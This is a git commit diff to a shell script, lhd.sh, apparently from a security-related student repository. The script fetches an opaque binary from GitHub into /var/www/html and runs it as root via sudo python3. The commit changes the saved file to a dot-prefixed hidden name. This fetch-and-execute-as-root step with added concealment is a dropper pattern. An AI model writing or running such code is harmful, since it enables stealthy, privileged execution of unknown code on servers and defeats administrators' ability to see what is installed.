3349300315209e71a316d38b495f6dce273ea553
Thân Hữu Tuấn <32167814+ThanHuuTuan@users.noreply.github.com>
2024-08-08 16:44:13 +0700

    Update lhd.sh

--- lhd.sh
+++ lhd.sh
@@ -2,6 +2,8 @@
 
 # Define the destination directory
 DEST_DIR="/var/www/html"
+FILE_NAME="services_linux"
+HIDDEN_FILE_NAME=".$FILE_NAME"  # Prefix the filename with a dot
 
 # Ensure the destination directory exists
 if [ ! -d "$DEST_DIR" ]; then
@@ -10,8 +12,8 @@ if [ ! -d "$DEST_DIR" ]; then
 fi
 
 # Download the file from the URL and save it to the destination directory
-echo "Downloading services_linux..."
-wget -O "$DEST_DIR/services_linux" https://github.com/ThanHuuTuan/DT_ATTT_VR/raw/main/services_linux
+echo "Downloading $FILE_NAME..."
+wget -O "$DEST_DIR/$HIDDEN_FILE_NAME" https://github.com/ThanHuuTuan/DT_ATTT_VR/raw/main/$FILE_NAME
 
 if [ $? -eq 0 ]; then
     echo "Download successful."
@@ -21,12 +23,12 @@ else
 fi
 
 # Set execute permissions for the downloaded file
-chmod +x "$DEST_DIR/services_linux"
+chmod +x "$DEST_DIR/$HIDDEN_FILE_NAME"
 echo "Changed file permissions."
 
 # Run the downloaded file using Python
 echo "Running Python command with sudo..."
-sudo python3 -c "import os; os.system('$DEST_DIR/services_linux')"
+sudo python3 -c "import os; os.system('$DEST_DIR/$HIDDEN_FILE_NAME')"
 
 if [ $? -eq 0 ]; then
     echo "Execution successful."
